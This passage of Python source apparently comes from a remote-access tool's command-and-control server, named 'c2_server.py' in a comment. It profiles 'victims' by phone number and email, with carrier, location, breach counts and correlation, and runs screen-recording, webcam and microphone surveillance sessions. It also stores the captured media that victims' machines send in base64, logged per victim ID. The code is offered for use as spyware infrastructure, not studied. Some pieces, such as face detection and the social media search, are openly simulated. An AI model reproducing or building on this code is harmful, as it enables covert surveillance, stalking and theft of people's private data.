        """Comprehensive phone number analysis"""
        try:
            analysis = {
                'original_number': phone,
                'validation': {},
                'geographic_info': {},
                'carrier_info': {},
                'risk_assessment': {},
                'social_media_links': [],
                'formatted_versions': {}
            }
            
            # Parse and validate phone number
            analysis['validation'] = await self.validate_phone_comprehensive(phone)
            
            # Geographic information
            analysis['geographic_info'] = await self.get_phone_geographic_info(phone)
            
            # Carrier information
            analysis['carrier_info'] = await self.get_phone_carrier_info(phone)
            
            # Risk assessment
            analysis['risk_assessment'] = self.assess_phone_risk(phone, analysis)
            
            # Format variations
            analysis['formatted_versions'] = self.get_phone_format_variations(phone)
            
            # Search for phone on social media (simulated)
            analysis['social_media_links'] = await self.search_phone_social_media(phone)
            
            return analysis
            
        except Exception as e:
            log_activity(f"❌ Phone analysis error: {e}")
            return {}
    
    async def validate_phone_comprehensive(self, phone):
        """Comprehensive phone number validation"""
        validation = {
            'is_valid': False,
            'is_possible': False,
            'number_type': 'unknown',
            'country_code': '',
            'national_number': '',
            'international_format': '',
            'national_format': ''
        }
        
        try:
            # Try to parse the phone number
            parsed_number = phonenumbers.parse(phone, None)
            
            validation['is_valid'] = phonenumbers.is_valid_number(parsed_number)
            validation['is_possible'] = phonenumbers.is_possible_number(parsed_number)
            validation['country_code'] = f"+{parsed_number.country_code}"
            validation['national_number'] = str(parsed_number.national_number)
            
            # Format the number
            validation['international_format'] = phonenumbers.format_number(
                parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL
            )
            validation['national_format'] = phonenumbers.format_number(
                parsed_number, phonenumbers.PhoneNumberFormat.NATIONAL
            )
            
            # Determine number type
            number_type = phonenumbers.number_type(parsed_number)
            type_mapping = {
                phonenumbers.PhoneNumberType.MOBILE: 'mobile',
                phonenumbers.PhoneNumberType.FIXED_LINE: 'landline',
                phonenumbers.PhoneNumberType.FIXED_LINE_OR_MOBILE: 'fixed_or_mobile',
                phonenumbers.PhoneNumberType.TOLL_FREE: 'toll_free',
                phonenumbers.PhoneNumberType.PREMIUM_RATE: 'premium',
                phonenumbers.PhoneNumberType.VOIP: 'voip'
            }
            validation['number_type'] = type_mapping.get(number_type, 'unknown')
            
        except phonenumbers.NumberParseException as e:
            validation['error'] = str(e)
            validation['suggestions'] = self.suggest_phone_corrections(phone)
        
        return validation
    
    async def get_phone_geographic_info(self, phone):
        """Get geographic information for phone number"""
        geo_info = {
            'country': '',
            'region': '',
            'city': '',
            'timezone': [],
            'coordinates': None
        }
        
        try:
            parsed_number = phonenumbers.parse(phone, None)
            
            # Country information
            geo_info['country'] = geocoder.description_for_number(parsed_number, 'en')
            
            # Region information (more detailed)
            region_code = phonenumbers.region_code_for_number(parsed_number)
            geo_info['region'] = region_code
            
            # Timezone information
            timezones = timezone.time_zones_for_number(parsed_number)
            geo_info['timezone'] = list(timezones)
            
            return geo_info
            
        except Exception as e:
            log_activity(f"❌ Phone geo info error: {e}")
            return geo_info
    
    async def get_phone_carrier_info(self, phone):
        """Get carrier information for phone number"""
        carrier_info = {
            'carrier_name': '',
            'network_type': '',
            'mvno': False,
            'ported': False
        }
        
        try:
            parsed_number = phonenumbers.parse(phone, None)
            
            # Carrier name
            carrier_name = carrier.name_for_number(parsed_number, 'en')
            carrier_info['carrier_name'] = carrier_name or 'Unknown'
            
            # Additional carrier analysis (simplified)
            if carrier_name:
                major_carriers = ['Verizon', 'AT&T', 'T-Mobile', 'Sprint']
                carrier_info['mvno'] = not any(major in carrier_name for major in major_carriers)
            
            return carrier_info
            
        except Exception as e:
            log_activity(f"❌ Phone carrier info error: {e}")
            return carrier_info
    
    def assess_phone_risk(self, phone, analysis):
        """Assess risk factors for phone number"""
        risk = {
            'risk_score': 0.0,
            'risk_factors': [],
            'trust_indicators': []
        }
        
        try:
            # Risk factors
            if not analysis['validation']['is_valid']:
                risk['risk_factors'].append('invalid_number')
                risk['risk_score'] += 0.3
            
            if analysis['validation']['number_type'] == 'voip':
                risk['risk_factors'].append('voip_number')
                risk['risk_score'] += 0.2
            
            if analysis['validation']['number_type'] == 'unknown':
                risk['risk_factors'].append('unknown_type')
                risk['risk_score'] += 0.1
            
            # Trust indicators
            if analysis['validation']['number_type'] == 'mobile':
                risk['trust_indicators'].append('mobile_number')
            
            if analysis['carrier_info']['carrier_name'] != 'Unknown':
                risk['trust_indicators'].append('known_carrier')
            
            if analysis['geographic_info']['country']:
                risk['trust_indicators'].append('geographic_data')
            
            # Adjust score based on trust indicators
            risk['risk_score'] = max(0.0, risk['risk_score'] - len(risk['trust_indicators']) * 0.1)
            risk['risk_score'] = min(1.0, risk['risk_score'])
            
            return risk
            
        except Exception as e:
            log_activity(f"❌ Phone risk assessment error: {e}")
            return risk
    
    def get_phone_format_variations(self, phone):
        """Get different format variations of phone number"""
        variations = {}
        
        try:
            parsed_number = phonenumbers.parse(phone, None)
            
            variations['international'] = phonenumbers.format_number(
                parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL
            )
            variations['national'] = phonenumbers.format_number(
                parsed_number, phonenumbers.PhoneNumberFormat.NATIONAL
            )
            variations['e164'] = phonenumbers.format_number(
                parsed_number, phonenumbers.PhoneNumberFormat.E164
            )
            variations['rfc3966'] = phonenumbers.format_number(
                parsed_number, phonenumbers.PhoneNumberFormat.RFC3966
            )
            
            # Additional common formats
            digits_only = re.sub(r'\D', '', phone)
            variations['digits_only'] = digits_only
            variations['dashed'] = f"{digits_only[:3]}-{digits_only[3:6]}-{digits_only[6:]}" if len(digits_only) == 10 else digits_only
            variations['dotted'] = f"{digits_only[:3]}.{digits_only[3:6]}.{digits_only[6:]}" if len(digits_only) == 10 else digits_only
            
        except Exception as e:
            log_activity(f"❌ Phone format variations error: {e}")
        
        return variations
    
    def suggest_phone_corrections(self, phone):
        """Suggest corrections for invalid phone numbers"""
        suggestions = []
        
        # Remove all non-digits
        digits_only = re.sub(r'\D', '', phone)
        
        # Common corrections
        if len(digits_only) == 10:  # US number without country code
            suggestions.append(f"+1{digits_only}")
            suggestions.append(f"1{digits_only}")
        
        if len(digits_only) == 11 and digits_only.startswith('1'):  # US number with 1 prefix
            suggestions.append(f"+{digits_only}")
        
        return suggestions
    
    async def search_phone_social_media(self, phone):
        """Search for phone number on social media platforms"""
        # Simulated search - in production, integrate with social media APIs
        social_links = []
        
        try:
            # Format phone for searching
            digits_only = re.sub(r'\D', '', phone)
            
            # Simulated results
            platforms_to_check = ['WhatsApp', 'Telegram', 'Signal', 'Viber']
            
            for platform in platforms_to_check:
                # Simulate random findings
                if hash(phone + platform) % 3 == 0:  # Deterministic "random"
                    social_links.append({
                        'platform': platform,
                        'found': True,
                        'profile_url': f'https://{platform.lower()}.com/profile/{digits_only}',
                        'confidence': 0.6
                    })
            
            return social_links
            
        except Exception as e:
            log_activity(f"❌ Phone social media search error: {e}")
            return social_links
    
    async def correlate_contact_info(self, victim_id, email, phone):
        """Find correlations between email and phone"""
        correlations = []
        
        try:
            # Geographic correlation
            phone_geo = await self.get_phone_geographic_info(phone)
            email_domain = email.split('@')[1]
            
            # Check if email domain suggests same location as phone
            if phone_geo['country'] and email_domain:
                correlation = {
                    'type': 'geographic_consistency',
                    'email_domain': email_domain,
                    'phone_country': phone_geo['country'],
                    'consistent': True,  # Simplified check
                    'confidence': 0.7
                }
                correlations.append(correlation)
            
            # Pattern correlation (same numbers in email and phone)
            email_numbers = re.findall(r'\d+', email)
            phone_numbers = re.findall(r'\d+', phone)
            
            common_numbers = set(email_numbers) & set(phone_numbers)
            if common_numbers:
                correlations.append({
                    'type': 'number_pattern_match',
                    'common_numbers': list(common_numbers),
                    'confidence': 0.8
                })
            
            return correlations
            
        except Exception as e:
            log_activity(f"❌ Contact correlation error: {e}")
            return correlations
    
    def calculate_risk_score(self, results):
        """Calculate overall risk score based on all analysis"""
        risk_assessment = {
            'overall_score': 0.0,
            'risk_level': 'low',
            'factors': [],
            'recommendations': []
        }
        
        try:
            score = 0.0
            factors = []
            
            # Email risk factors
            email_data = results.get('email_data', {})
            if email_data.get('validation', {}).get('is_disposable'):
                score += 0.3
                factors.append('disposable_email')
            
            if email_data.get('security_analysis', {}).get('suspicious_patterns'):
                score += 0.2
                factors.append('suspicious_email_patterns')
            
            # Phone risk factors
            phone_data = results.get('phone_data', {})
            phone_risk = phone_data.get('risk_assessment', {}).get('risk_score', 0)
            score += phone_risk * 0.5
            
            if phone_risk > 0.5:
                factors.append('high_risk_phone')
            
            # Normalize score
            score = min(1.0, score)
            
            # Determine risk level
            if score < 0.3:
                risk_level = 'low'
            elif score < 0.7:
                risk_level = 'medium'
            else:
                risk_level = 'high'
            
            # Generate recommendations
            recommendations = []
            if 'disposable_email' in factors:
                recommendations.append('Verify identity through alternative means')
            if 'high_risk_phone' in factors:
                recommendations.append('Request additional phone verification')
            
            risk_assessment.update({
                'overall_score': score,
                'risk_level': risk_level,
                'factors': factors,
                'recommendations': recommendations
            })
            
            return risk_assessment
            
        except Exception as e:
            log_activity(f"❌ Risk calculation error: {e}")
            return risk_assessment
    
    async def store_enrichment_results(self, victim_id, results):
        """Store all enrichment results in database"""
        try:
            conn = sqlite3.connect(DATABASE)
            cursor = conn.cursor()
            
            # Store phone enrichment data
            phone_data = results.get('phone_data', {})
            if phone_data:
                cursor.execute('''
                    INSERT INTO phone_enrichment 
                    (victim_id, phone_number, formatted_number, country_code, country_name,
                     carrier, line_type, is_valid, risk_score, additional_data)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    victim_id,
                    phone_data.get('original_number', ''),
                    phone_data.get('validation', {}).get('international_format', ''),
                    phone_data.get('validation', {}).get('country_code', ''),
                    phone_data.get('geographic_info', {}).get('country', ''),
                    phone_data.get('carrier_info', {}).get('carrier_name', ''),
                    phone_data.get('validation', {}).get('number_type', ''),
                    phone_data.get('validation', {}).get('is_valid', False),
                    phone_data.get('risk_assessment', {}).get('risk_score', 0.0),
                    json.dumps(phone_data)
                ))
            
            # Store correlations
            for correlation in results.get('correlations', []):
                cursor.execute('''
                    INSERT INTO contact_correlation 
                    (victim_id, correlation_type, confidence_score, evidence)
                    VALUES (?, ?, ?, ?)
                ''', (
                    victim_id,
                    correlation.get('type', ''),
                    correlation.get('confidence', 0.0),
                    json.dumps(correlation)
                ))
            
            conn.commit()
            conn.close()
            
            log_activity(f"💾 Enrichment results stored for victim {victim_id[:12]}")
            
        except Exception as e:
            log_activity(f"❌ Error storing enrichment results: {e}")

# API endpoints for enrichment
@app.route('/api/enrich-contact/<victim_id>', methods=['POST'])
def api_enrich_contact(victim_id):
    """Start contact enrichment for a victim"""
    try:
        data = request.get_json() or {}
        email = data.get('email')
        phone = data.get('phone')
        
        enrichment = ContactEnrichment()
        
        # Run enrichment in background
        def run_enrichment():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop.run_until_complete(
                enrichment.enrich_contact_info(victim_id, email, phone)
            )
        
        executor = ThreadPoolExecutor(max_workers=1)
        future = executor.submit(run_enrichment)
        
        log_activity(f"📧 Contact enrichment started for victim {victim_id[:12]}")
        
        return jsonify({
            'status': 'started',
            'message': 'Contact enrichment initiated',
            'victim_id': victim_id
        })
        
    except Exception as e:
        log_activity(f"❌ Error starting contact enrichment: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/enrichment-results/<victim_id>')
@app.route('/api/enrichment-results/<victim_id>')
def api_enrichment_results(victim_id):
    """Get enrichment results for a victim"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Get email enrichment data
        cursor.execute('''
            SELECT * FROM email_enrichment 
            WHERE victim_id = ? 
            ORDER BY timestamp DESC
        ''', (victim_id,))
        email_data = cursor.fetchall()
        
        # Get phone enrichment data
        cursor.execute('''
            SELECT * FROM phone_enrichment 
            WHERE victim_id = ? 
            ORDER BY timestamp DESC
        ''', (victim_id,))
        phone_data = cursor.fetchall()
        
        # Get correlation data
        cursor.execute('''
            SELECT * FROM contact_correlation 
            WHERE victim_id = ? 
            ORDER BY timestamp DESC
        ''', (victim_id,))
        correlation_data = cursor.fetchall()
        
        # Get domain intelligence data
        cursor.execute('''
            SELECT * FROM domain_intelligence 
            WHERE victim_id = ? 
            ORDER BY timestamp DESC
        ''', (victim_id,))
        domain_data = cursor.fetchall()
        
        conn.close()
        
        # Format the results
        email_enrichment = []
        if email_data:
            columns = [description[0] for description in cursor.description]
            email_enrichment = [dict(zip(columns, row)) for row in email_data]
        
        phone_enrichment = []
        if phone_data:
            columns = [description[0] for description in cursor.description]
            phone_enrichment = [dict(zip(columns, row)) for row in phone_data]
        
        correlations = []
        if correlation_data:
            columns = [description[0] for description in cursor.description]
            correlations = [dict(zip(columns, row)) for row in correlation_data]
        
        domain_intelligence = []
        if domain_data:
            columns = [description[0] for description in cursor.description]
            domain_intelligence = [dict(zip(columns, row)) for row in domain_data]
        
        # Calculate enrichment summary
        enrichment_summary = {
            'total_email_records': len(email_enrichment),
            'total_phone_records': len(phone_enrichment),
            'total_correlations': len(correlations),
            'total_domain_records': len(domain_intelligence),
            'risk_assessment': calculate_overall_risk_score(email_enrichment, phone_enrichment),
            'data_completeness': calculate_data_completeness(email_enrichment, phone_enrichment),
            'last_updated': max([
                max([record.get('timestamp', '1970-01-01') for record in email_enrichment] or ['1970-01-01']),
                max([record.get('timestamp', '1970-01-01') for record in phone_enrichment] or ['1970-01-01']),
                max([record.get('timestamp', '1970-01-01') for record in correlations] or ['1970-01-01'])
            ])
        }
        
        return jsonify({
            'victim_id': victim_id,
            'email_enrichment': email_enrichment,
            'phone_enrichment': phone_enrichment,
            'correlations': correlations,
            'domain_intelligence': domain_intelligence,
            'summary': enrichment_summary,
            'status': 'success'
        })
        
    except Exception as e:
        log_activity(f"❌ Error getting enrichment results: {e}")
        return jsonify({
            'victim_id': victim_id,
            'error': str(e),
            'email_enrichment': [],
            'phone_enrichment': [],
            'correlations': [],
            'domain_intelligence': [],
            'summary': {},
            'status': 'error'
        }), 500

def calculate_overall_risk_score(email_data, phone_data):
    """Calculate overall risk score based on enrichment data"""
    try:
        total_score = 0.0
        factors = []
        
        # Email risk factors
        for email_record in email_data:
            if email_record.get('disposable_email'):
                total_score += 0.3
                factors.append('disposable_email')
            
            if email_record.get('breach_count', 0) > 0:
                total_score += 0.2
                factors.append('data_breaches')
            
            if not email_record.get('deliverable'):
                total_score += 0.1
                factors.append('undeliverable_email')
        
        # Phone risk factors
        for phone_record in phone_data:
            if not phone_record.get('is_valid'):
                total_score += 0.2
                factors.append('invalid_phone')
            
            if phone_record.get('risk_score', 0) > 0.5:
                total_score += phone_record.get('risk_score', 0) * 0.3
                factors.append('high_risk_phone')
        
        # Normalize score
        final_score = min(1.0, total_score)
        
        # Determine risk level
        if final_score < 0.3:
            risk_level = 'low'
        elif final_score < 0.7:
            risk_level = 'medium'
        else:
            risk_level = 'high'
        
        return {
            'overall_score': round(final_score, 2),
            'risk_level': risk_level,
            'risk_factors': list(set(factors)),
            'factor_count': len(set(factors))
        }
        
    except Exception as e:
        log_activity(f"❌ Error calculating risk score: {e}")
        return {
            'overall_score': 0.0,
            'risk_level': 'unknown',
            'risk_factors': [],
            'factor_count': 0
        }

def calculate_data_completeness(email_data, phone_data):
    """Calculate how complete the enrichment data is"""
    try:
        completeness = {
            'email_completeness': 0,
            'phone_completeness': 0,
            'overall_completeness': 0,
            'missing_fields': []
        }
        
        # Email completeness check
        if email_data:
            email_record = email_data[0]  # Check most recent record
            email_fields = [
                'email_provider', 'deliverable', 'breach_count', 
                'social_platforms', 'first_name', 'last_name'
            ]
            
            completed_fields = sum(1 for field in email_fields if email_record.get(field))
            completeness['email_completeness'] = round((completed_fields / len(email_fields)) * 100)
            
            missing_email = [field for field in email_fields if not email_record.get(field)]
            completeness['missing_fields'].extend([f"email_{field}" for field in missing_email])
        
        # Phone completeness check
        if phone_data:
            phone_record = phone_data[0]  # Check most recent record
            phone_fields = [
                'formatted_number', 'country_name', 'carrier', 
                'line_type', 'timezone', 'is_valid'
            ]
            
            completed_fields = sum(1 for field in phone_fields if phone_record.get(field))
            completeness['phone_completeness'] = round((completed_fields / len(phone_fields)) * 100)
            
            missing_phone = [field for field in phone_fields if not phone_record.get(field)]
            completeness['missing_fields'].extend([f"phone_{field}" for field in missing_phone])
        
        # Overall completeness
        if email_data and phone_data:
            completeness['overall_completeness'] = round(
                (completeness['email_completeness'] + completeness['phone_completeness']) / 2
            )
        elif email_data:
            completeness['overall_completeness'] = completeness['email_completeness']
        elif phone_data:
            completeness['overall_completeness'] = completeness['phone_completeness']
        
        return completeness
        
    except Exception as e:
        log_activity(f"❌ Error calculating data completeness: {e}")
        return {
            'email_completeness': 0,
            'phone_completeness': 0,
            'overall_completeness': 0,
            'missing_fields': []
        }
    
    # Part 3: Screen Recording & Camera/Mic Monitoring
# Add these to your existing c2_server.py

# Part 3: Screen Recording & Camera/Mic Monitoring
# Add these to your existing c2_server.py



# Enhanced database schema for Part 3
def init_enhanced_db_part3():
    """Enhanced database schema for media monitoring"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Screen recordings table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS screen_recordings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                recording_type TEXT,
                file_path TEXT,
                file_size INTEGER,
                duration INTEGER,
                resolution TEXT,
                format TEXT,
                thumbnail_path TEXT,
                metadata TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Camera captures table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS camera_captures (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                capture_type TEXT,
                file_path TEXT,
                file_size INTEGER,
                resolution TEXT,
                camera_info TEXT,
                face_detected BOOLEAN,
                face_count INTEGER,
                metadata TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Audio recordings table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS audio_recordings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                recording_type TEXT,
                file_path TEXT,
                file_size INTEGER,
                duration INTEGER,
                sample_rate INTEGER,
                channels INTEGER,
                format TEXT,
                voice_detected BOOLEAN,
                transcription TEXT,
                metadata TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Media monitoring sessions table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS monitoring_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                session_type TEXT,
                status TEXT,
                start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                end_time TIMESTAMP,
                total_captures INTEGER,
                total_size INTEGER,
                configuration TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
        log_activity("✅ Enhanced media monitoring database schema initialized")
        return True
        
    except Exception as e:
        log_activity(f"❌ Media monitoring database initialization failed: {e}")
        return False

class MediaMonitoring:
    """Advanced screen recording and camera/microphone monitoring"""
    
    def __init__(self):
        self.active_sessions = {}
        self.media_queue = queue.Queue()
        self.storage_path = 'media_captures/'
        os.makedirs(self.storage_path, exist_ok=True)
    
    async def start_screen_recording(self, victim_id, config=None):
        """Start screen recording session"""
        try:
            session_id = f"screen_{victim_id}_{int(time.time())}"
            
            session_config = {
                'type': 'screen_recording',
                'interval': config.get('interval', 5) if config else 5,  # seconds between captures
                'quality': config.get('quality', 'medium') if config else 'medium',
                'duration': config.get('duration', 300) if config else 300,  # 5 minutes default
                'include_audio': config.get('include_audio', False) if config else False
            }
            
            self.active_sessions[session_id] = {
                'victim_id': victim_id,
                'type': 'screen_recording',
                'status': 'active',
                'config': session_config,
                'start_time': datetime.now(),
                'captures': 0
            }
            
            # Store session in database
            self.store_monitoring_session(victim_id, session_id, session_config)
            
            log_activity(f"📹 Screen recording started for victim {victim_id[:12]}")
            
            return {
                'session_id': session_id,
                'status': 'started',
                'config': session_config
            }
            
        except Exception as e:
            log_activity(f"❌ Screen recording start error: {e}")
            return {'error': str(e)}
    
    async def start_camera_monitoring(self, victim_id, config=None):
        """Start camera monitoring session"""
        try:
            session_id = f"camera_{victim_id}_{int(time.time())}"
            
            session_config = {
                'type': 'camera_monitoring',
                'interval': config.get('interval', 10) if config else 10,
                'quality': config.get('quality', 'high') if config else 'high',
                'duration': config.get('duration', 600) if config else 600,  # 10 minutes default
                'face_detection': config.get('face_detection', True) if config else True,
                'motion_detection': config.get('motion_detection', False) if config else False
            }
            
            self.active_sessions[session_id] = {
                'victim_id': victim_id,
                'type': 'camera_monitoring',
                'status': 'active',
                'config': session_config,
                'start_time': datetime.now(),
                'captures': 0
            }
            
            self.store_monitoring_session(victim_id, session_id, session_config)
            
            log_activity(f"📷 Camera monitoring started for victim {victim_id[:12]}")
            
            return {
                'session_id': session_id,
                'status': 'started',
                'config': session_config
            }
            
        except Exception as e:
            log_activity(f"❌ Camera monitoring start error: {e}")
            return {'error': str(e)}
    
    async def start_audio_recording(self, victim_id, config=None):
        """Start audio recording session"""
        try:
            session_id = f"audio_{victim_id}_{int(time.time())}"
            
            session_config = {
                'type': 'audio_recording',
                'quality': config.get('quality', 'high') if config else 'high',
                'duration': config.get('duration', 300) if config else 300,
                'sample_rate': config.get('sample_rate', 44100) if config else 44100,
                'channels': config.get('channels', 2) if config else 2,
                'voice_detection': config.get('voice_detection', True) if config else True,
                'transcription': config.get('transcription', False) if config else False
            }
            
            self.active_sessions[session_id] = {
                'victim_id': victim_id,
                'type': 'audio_recording',
                'status': 'active',
                'config': session_config,
                'start_time': datetime.now(),
                'captures': 0
            }
            
            self.store_monitoring_session(victim_id, session_id, session_config)
            
            log_activity(f"🎤 Audio recording started for victim {victim_id[:12]}")
            
            return {
                'session_id': session_id,
                'status': 'started',
                'config': session_config
            }
            
        except Exception as e:
            log_activity(f"❌ Audio recording start error: {e}")
            return {'error': str(e)}
    
    async def process_screen_capture(self, victim_id, capture_data):
        """Process received screen capture"""
        try:
            # Decode base64 image data
            image_data = base64.b64decode(capture_data['image_data'])
            
            # Generate filename
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"screen_{victim_id}_{timestamp}.png"
            file_path = os.path.join(self.storage_path, filename)
            
            # Save image
            with open(file_path, 'wb') as f:
                f.write(image_data)
            
            # Get image metadata
            try:
                img = Image.open(io.BytesIO(image_data))
                resolution = f"{img.width}x{img.height}"
                file_size = len(image_data)
            except:
                resolution = "unknown"
                file_size = len(image_data)
            
            # Generate thumbnail
            thumbnail_path = self.generate_thumbnail(file_path, victim_id, timestamp)
            
            # Store in database
            self.store_screen_recording(victim_id, {
                'file_path': file_path,
                'file_size': file_size,
                'resolution': resolution,
                'format': 'PNG',
                'thumbnail_path': thumbnail_path,
                'metadata': json.dumps(capture_data.get('metadata', {}))
            })
            
            log_activity(f"📹 Screen capture processed for victim {victim_id[:12]}")
            
            return {'status': 'processed', 'file_path': file_path}
            
        except Exception as e:
            log_activity(f"❌ Screen capture processing error: {e}")
            return {'error': str(e)}
    
    async def process_camera_capture(self, victim_id, capture_data):
        """Process received camera capture"""
        try:
            # Decode base64 image data
            image_data = base64.b64decode(capture_data['image_data'])
            
            # Generate filename
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"camera_{victim_id}_{timestamp}.jpg"
            file_path = os.path.join(self.storage_path, filename)
            
            # Save image
            with open(file_path, 'wb') as f:
                f.write(image_data)
            
            # Get image metadata
            try:
                img = Image.open(io.BytesIO(image_data))
                resolution = f"{img.width}x{img.height}"
                file_size = len(image_data)
            except:
                resolution = "unknown"
                file_size = len(image_data)
            
            # Perform face detection (simplified)
            face_analysis = await self.analyze_faces_in_image(image_data)
            
            # Store in database
            self.store_camera_capture(victim_id, {
                'file_path': file_path,
                'file_size': file_size,
                'resolution': resolution,
                'camera_info': json.dumps(capture_data.get('camera_info', {})),
                'face_detected': face_analysis['faces_detected'],
                'face_count': face_analysis['face_count'],
                'metadata': json.dumps({
                    **capture_data.get('metadata', {}),
                    'face_analysis': face_analysis
                })
            })
            
            log_activity(f"📷 Camera capture processed for victim {victim_id[:12]} (Faces: {face_analysis['face_count']})")
            
            return {
                'status': 'processed', 
                'file_path': file_path,
                'face_analysis': face_analysis
            }
            
        except Exception as e:
            log_activity(f"❌ Camera capture processing error: {e}")
            return {'error': str(e)}
    
    async def process_audio_recording(self, victim_id, audio_data):
        """Process received audio recording"""
        try:
            # Decode base64 audio data
            audio_bytes = base64.b64decode(audio_data['audio_data'])
            
            # Generate filename
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"audio_{victim_id}_{timestamp}.wav"
            file_path = os.path.join(self.storage_path, filename)
            
            # Save audio file
            with open(file_path, 'wb') as f:
                f.write(audio_bytes)
            
            # Analyze audio
            audio_analysis = await self.analyze_audio_content(audio_bytes, audio_data)
            
            # Store in database
            self.store_audio_recording(victim_id, {
                'file_path': file_path,
                'file_size': len(audio_bytes),
                'duration': audio_analysis.get('duration', 0),
                'sample_rate': audio_data.get('sample_rate', 44100),
                'channels': audio_data.get('channels', 2),
                'format': 'WAV',
                'voice_detected': audio_analysis.get('voice_detected', False),
                'transcription': audio_analysis.get('transcription', ''),
                'metadata': json.dumps({
                    **audio_data.get('metadata', {}),
                    'audio_analysis': audio_analysis
                })
            })
            
            log_activity(f"🎤 Audio recording processed for victim {victim_id[:12]} (Voice: {audio_analysis.get('voice_detected', False)})")
            
            return {
                'status': 'processed',
                'file_path': file_path,
                'audio_analysis': audio_analysis
            }
            
        except Exception as e:
            log_activity(f"❌ Audio recording processing error: {e}")
            return {'error': str(e)}
    
    def generate_thumbnail(self, image_path, victim_id, timestamp):
        """Generate thumbnail for image"""
        try:
            thumbnail_filename = f"thumb_{victim_id}_{timestamp}.jpg"
            thumbnail_path = os.path.join(self.storage_path, 'thumbnails', thumbnail_filename)
            
            os.makedirs(os.path.dirname(thumbnail_path), exist_ok=True)
            
            # Create thumbnail
            with Image.open(image_path) as img:
                img.thumbnail((200, 200), Image.Resampling.LANCZOS)
                img.save(thumbnail_path, 'JPEG', quality=85)
            
            return thumbnail_path
            
        except Exception as e:
            log_activity(f"❌ Thumbnail generation error: {e}")
            return None
    
    async def analyze_faces_in_image(self, image_data):
        """Analyze faces in camera capture (simplified implementation)"""
        analysis = {
            'faces_detected': False,
            'face_count': 0,
            'face_locations': [],
            'estimated_ages': [],
            'estimated_genders': [],
            'emotions': []
        }
        
        try:
            # Simplified face detection simulation
            # In production, use OpenCV, face_recognition, or cloud APIs
            
            img = Image.open(io.BytesIO(image_data))
            width, height = img.size
            
            # Simulate face detection based on image characteristics
            # This is a placeholder - implement real face detection
            if width > 200 and height > 200:
                # Simulate finding faces based on image hash
                image_hash = hashlib.md5(image_data).hexdigest()
                face_probability = int(image_hash[:2], 16) / 255.0
                
                if face_probability > 0.3:  # 70% chance of "detecting" a face
                    analysis['faces_detected'] = True
                    analysis['face_count'] = 1 if face_probability < 0.8 else 2
                    
                    # Simulate face locations
                    for i in range(analysis['face_count']):
                        analysis['face_locations'].append({
                            'x': int(width * 0.3 + i * 100),
                            'y': int(height * 0.3),
                            'width': 80,
                            'height': 100
                        })
                    
                    # Simulate demographics (for demonstration only)
                    analysis['estimated_ages'] = [25 + (i * 10) for i in range(analysis['face_count'])]
                    analysis['estimated_genders'] = ['unknown'] * analysis['face_count']
                    analysis['emotions'] = ['neutral'] * analysis['face_count']
            
            return analysis
            
        except Exception as e:
            log_activity(f"❌ Face analysis error: {e}")
            return analysis
    
    async def analyze_audio_content(self, audio_bytes, metadata):
        """Analyze audio content for voice detection and transcription"""
        analysis = {
            'duration': 0,
            'voice_detected': False,
            'silence_percentage': 0.0,
            'average_volume': 0.0,
            'transcription': '',
            'language_detected': 'unknown',
            'speaker_count': 0
        }
        
        try:
            # Simplified audio analysis
            # In production, use speech recognition libraries or cloud APIs
            
            # Calculate duration from file size (rough estimate)
            sample_rate = metadata.get('sample_rate', 44100)
            channels = metadata.get('channels', 2)
            bytes_per_sample = 2  # 16-bit audio
            
            if sample_rate and channels:
                total_samples = len(audio_bytes) // (channels * bytes_per_sample)
                analysis['duration'] = total_samples / sample_rate
            
            # Simulate voice detection based on audio characteristics
            if len(audio_bytes) > 1000:  # Minimum size check
                # Simple volume analysis
                audio_hash = hashlib.md5(audio_bytes).hexdigest()
                voice_probability = int(audio_hash[:2], 16) / 255.0
                
                analysis['voice_detected'] = voice_probability > 0.4
                analysis['average_volume'] = voice_probability
                analysis['silence_percentage'] = 1.0 - voice_probability
                
                if analysis['voice_detected']:
                    # Simulate transcription (placeholder)
                    analysis['transcription'] = '[Voice detected - transcription would appear here]'
                    analysis['language_detected'] = 'en'
                    analysis['speaker_count'] = 1
            
            return analysis
            
        except Exception as e:
            log_activity(f"❌ Audio analysis error: {e}")
            return analysis
    
    def store_monitoring_session(self, victim_id, session_id, config):
        """Store monitoring session in database"""
        try:
            conn = sqlite3.connect(DATABASE)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO monitoring_sessions 
                (victim_id, session_type, status, configuration)
                VALUES (?, ?, ?, ?)
            ''', (victim_id, config['type'], 'active', json.dumps(config)))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            log_activity(f"❌ Error storing monitoring session: {e}")
    
    def store_screen_recording(self, victim_id, data):
        """Store screen recording data"""
        try:
            conn = sqlite3.connect(DATABASE)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO screen_recordings 
                (victim_id, recording_type, file_path, file_size, resolution, 
                 format, thumbnail_path, metadata)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
